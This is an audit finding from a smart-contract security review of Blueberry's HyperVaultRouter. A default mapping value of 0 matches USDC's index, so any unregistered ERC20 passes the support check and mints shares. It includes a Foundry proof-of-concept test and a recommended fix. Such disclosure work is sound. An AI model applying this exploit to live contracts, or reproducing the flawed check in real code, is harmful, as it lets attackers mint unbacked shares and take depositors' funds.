---
tags:
  - lang/solidity
  - platform/pashov
  - has/github
  - has/poc
  - severity/high
  - sector/lending
  - sector/stable
  - sector/token
protocol: "[[Blueberry]]"
auditors:
  - "[[Pashov Audit Group]]"
report: "https://github.com/pashov/audits/blob/master/team/md/Blueberry-security-review_2025-04-30.md"
genome:
  - "[[wrong-condition]]"
  - "[[wrong-state]]"
  - "[[liquidation-underwater]]"
  - "[[oracle-freshness]]"
---
# [C-02] Missing asset index check allows any token to mint shares

- id: 61477
- impact: HIGH
- protocol: Blueberry_2025-04-30
- reporter: Pashov Audit Group
- source: https://github.com/pashov/audits/blob/master/team/md/[[Blueberry]]-security-review_2025-04-30.md

## Summary


The report discusses a bug in the HyperVaultRouter contract that can potentially cause issues with the deposit function. This function checks if the token being deposited is supported by the contract, but the check is flawed. This means that any user can deposit a random ERC20 token, which will be incorrectly treated as USDC, potentially leading to the creation of shares based on the wrong value. The report recommends disallowing the use of index 0 for any token other than USDC to prevent this issue.

## Details


## Severity

**Impact:** High

**Likelihood:** High

## Description

The deposit function in the HyperVaultRouter contract performs a check to ensure that the deposited token is supported via the _isAssetSupported method, using the asset index retrieved from $.assetIndexes[asset]. However, this check is flawed due to the following logic:

```solidity
        uint64 assetIndex_ = $.assetIndexes[asset];
        require(_isAssetSupported($, assetIndex_), Errors.COLLATERAL_NOT_SUPPORTED());

````
If a token is not registered (i.e., not added via addAsset), the mapping $.assetIndexes[asset] returns the default value of 0. Since USDC is hardcoded to index 0 (USDC_SPOT_INDEX = 0), and USDC is a valid and supported asset, this check will falsely pass for any unsupported ERC20 token whose address is not in the assetIndexes mapping.

As a result:
- Any user can call deposit() with a random, potentially worthless ERC20 token.
- The protocol will incorrectly treat the token as USDC.
- Shares will be minted based on the USDC value.


POC:
https://gist.github.com/tevrat-aksoy/da734f144cd0176c41a3161ca74ab791
```solidity
    function testAnyTokenCanDeposited() public {
        //  First add the asset to the router
        router.addAsset(address(asset), 0, 0);
        router.setWithdrawAsset(address(asset));

        //  Then mint tokens to Alice
        asset.mint(alice, 100e8);

        vm.startPrank(alice);
        asset.approve(address(router), 100e8);
        router.deposit(usdcADDRESS, 100e8);

        assertEq(shareToken.balanceOf(address(alice)), 100e18, "alice should have 100e8 shares");

        assertEq(router.tvl(), 100e18, "alice should have 100e8 shares");

        // Create random token and deposit
        MockERC20 randomERC = new MockERC20("Random", "RND", 8);
        randomERC.mint(bob, 100e8);
        vm.startPrank(bob);

        randomERC.approve(address(router), 100e8);
        router.deposit(address(randomERC), 100e8);

        assertEq(shareToken.balanceOf(address(bob)), 100e18, "bob should have 100e8 shares");
        // TVL didnt change but share token supply increased
        assertEq(router.tvl(), 100e18, "alice should have 100e8 shares");
    }
```


## Recommendations

Disallow assetIndex_ == 0 unless asset is known to be USDC:
Add a special-case check to validate the asset is USDC when index is 0.
